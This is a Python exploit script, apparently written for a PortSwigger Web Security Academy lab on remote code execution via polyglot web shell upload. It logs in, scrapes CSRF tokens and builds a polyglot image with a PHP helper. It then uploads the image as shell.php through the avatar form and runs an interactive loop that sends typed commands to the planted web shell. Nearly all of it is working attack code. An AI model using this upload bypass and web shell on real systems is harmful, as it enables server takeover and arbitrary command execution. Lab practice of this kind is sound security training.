import http.client
import re
import ssl
import urllib.parse
import subprocess

from werkzeug.datastructures.file_storage import FileStorage
from werkzeug.test import encode_multipart

LAB_ID = "0af400a70468220a8064a33800410067"


def GET_login() -> http.client.HTTPResponse:
    method, path = 'GET', '/login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net/',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, ''.encode('utf-8'), headers)
    return connection.getresponse()


def POST_login(session: str, csrf: str) -> http.client.HTTPResponse:
    method, path = 'POST', '/login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': f'session={session}',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'referer': f'https://{LAB_ID}.web-security-academy.net/login',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    fields = {
        'csrf': csrf,
        'username': 'wiener',
        'password': 'peter',
    }
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def GET_myaccount(session: str) -> http.client.HTTPResponse:
    method, path = 'GET', '/my-account?id=wiener'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net/',
        'cookie': f'session={session}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, ''.encode('utf-8'), headers)
    return connection.getresponse()


def POST_myaccount_avatar_shell(csrf: str, session: str) -> http.client.HTTPResponse:
    method, path = 'POST', '/my-account/avatar'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'multipart/form-data; boundary=---------------------------148822020014584144771019061081',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'referer': f'https://{LAB_ID}.web-security-academy.net/my-account?id=wiener',
        'cookie': f'session={session}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    fields = {
        'user': 'wiener',
        'csrf': csrf,
    }
    files = {
        'avatar': {
            'filename': 'shell.php',
            'content_type': 'application/x-httpd-php',
            'file_path': 'shell.jpg',
        },
    }
    _, body = encode_multipart(
        boundary='---------------------------148822020014584144771019061081',
        values={
                   field_name: field_value
                   for field_name, field_value in fields.items()
               } | {
                   field_name: FileStorage(
                       filename=file['filename'],
                       content_type=file['content_type'],
                       stream=open(file['file_path'], 'rb'),
                   ) for field_name, file in files.items()
               },
    )
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def GET_files_avatars_shell_php(command: str) -> http.client.HTTPResponse:
    params = {'command': command}
    method, path = 'GET', f'/files/avatars/shell.php?{urllib.parse.urlencode(params)}'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net/my-account?id=wiener',
        'cookie': f'session={session}',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, ''.encode('utf-8'), headers)
    return connection.getresponse()


def login_csrf() -> tuple[str, str]:
    response = GET_login()
    cookie_header = response.getheader('set-cookie')
    session = re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]
    csrf = re.findall(r'name=\"csrf\" value=\"([a-zA-Z0-9]+)\"', response.read().decode('utf-8'))[0]
    return session, csrf


def file_upload_csrf(session: str) -> str:
    response = GET_myaccount(session)
    response_body = response.read().decode('utf-8')
    return re.findall(r'name=\"csrf\" value=\"([a-zA-Z0-9]+)\"', response_body)[0]


def login_session() -> str:
    session, csrf = login_csrf()
    response = POST_login(session, csrf)
    cookie_header = response.getheader('set-cookie')
    return re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]


subprocess.run(
    ['php', '-d', 'phar.readonly=0', 'Remote-code-execution-via-polyglot-web-shell-upload.php']
)
print("created polyglot image.")
session = login_session()
print("logged in.")
print(f"session: {session}")
csrf = file_upload_csrf(session)
print("got csrf.")
print(f"file upload csrf: {csrf}")
POST_myaccount_avatar_shell(csrf, session)
print("got shell.")
while True:
    command = input("insert command: ")
    print(GET_files_avatars_shell_php(command).read())
